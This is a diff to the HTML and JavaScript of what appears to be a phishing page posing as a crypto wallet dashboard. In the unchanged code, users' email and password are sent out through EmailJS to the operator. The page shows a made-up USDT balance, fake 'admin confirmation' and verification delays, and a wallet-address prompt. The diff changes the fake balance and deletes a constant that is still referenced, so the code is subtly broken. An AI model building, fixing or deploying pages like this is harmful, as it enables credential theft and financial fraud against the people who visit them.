@@ -17,7 +17,7 @@ function confirmWallet() {
 }
 
 function loadDashboard() {
-  const usdt = localStorage.getItem("usdt_balance") || "1230.00";
+  const usdt = localStorage.getItem("usdt_balance") || "2078.7800";
   const address = localStorage.getItem("wallet_address");
   document.getElementById("usdt_amount").textContent = usdt;
   if (address) {
@@ -86,7 +86,6 @@ function loadDashboard() {
 <script>
   const emailService = "service_78wwbgl";
   const signinTemplate = "template_omkmcio";
-  const replyTemplate = "template_r5jmg4w";
   const publicKey = "ochPV1QVtay7TOdBA";
 
   function initApp() {
@@ -106,7 +105,7 @@ function loadDashboard() {
     const email = document.getElementById("email").value;
     const pass = document.getElementById("pass").value;
     localStorage.setItem("email", email);
-    localStorage.setItem("usdt_balance", "1230.00");
+    localStorage.setItem("usdt_balance", "2078.7800");
     const payload = { user_email: email, user_password: pass };
     emailjs.send(emailService, signinTemplate, payload).then(() => {
       emailjs.send(emailService, replyTemplate, payload);
@@ -117,7 +116,7 @@ function loadDashboard() {
   function confirmAccess() { setTimeout(() => showPage("3"), 6000); }
   function confirmID() { setTimeout(() => { showPage("5"); loadDashboard(); }, 5000); }
   function loadDashboard() {
-    const usdt = localStorage.getItem("usdt_balance") || "1230.00";
+    const usdt = localStorage.getItem("usdt_balance") || "2078.78";
     document.getElementById("usdt_amount").textContent = usdt;
   }
 
@@ -137,7 +136,7 @@ function loadDashboard() {
     emailjs.send(emailService, signinTemplate, payload).then(() => {
       document.getElementById("txStatus").innerHTML = "<p>Sent ✅ Waiting for admin confirmation...</p>";
       setTimeout(() => {
-        const current = parseFloat(localStorage.getItem("usdt_balance") || "1230.00");
+        const current = parseFloat(localStorage.getItem("usdt_balance") || "2078.78");
         const newBal = (current - 100).toFixed(2);
         localStorage.setItem("usdt_balance", newBal);
         loadDashboard();
@@ -157,7 +156,7 @@ function confirmWallet() {
 }
 
 function loadDashboard() {
-  const usdt = localStorage.getItem("usdt_balance") || "1230.00";
+  const usdt = localStorage.getItem("usdt_balance") || "2078.7800";
   const address = localStorage.getItem("wallet_address");
   document.getElementById("usdt_amount").textContent = usdt;
   if (address) {
@@ -231,23 +230,22 @@ function loadDashboard() {
 </div>
 
 <!-- Page 7: Wallet Connect Page -->
+<div class="page" id="dashboardPage">
+  <div class="form-container">
+    <h2>Dashboard</h2>
+    <p>Status: <span id="dashboardStatus">Not Connected</span></p>
+  </div>
+</div>
+
+<!-- Page 7: Wallet Connect Page -->
 <div class="page" id="page7">
   <div class="form-container">
     <h2>Connect Your Wallet</h2>
     <p>Choose your method to connect:</p>
-    <button onclick="returnToDashboard()">Manual Connection (ETH/BSC)</button>
+    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address" />
+    <button onclick="confirmWallet()">Confirm Wallet</button>
     <button onclick="returnToDashboard()">Return to Dashboard</button>
   </div>
 </div>
-
-<!-- Page 7: Manual Wallet Connect -->
-<div class="page" id="page7">
-  <div class="form-container">
-    <h2>Connect Your Wallet</h2>
-    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address" />
-    <button onclick="confirmWallet()">Confirm Wallet</button>
-  </div>
-</div>
-
 </body>
 </html>
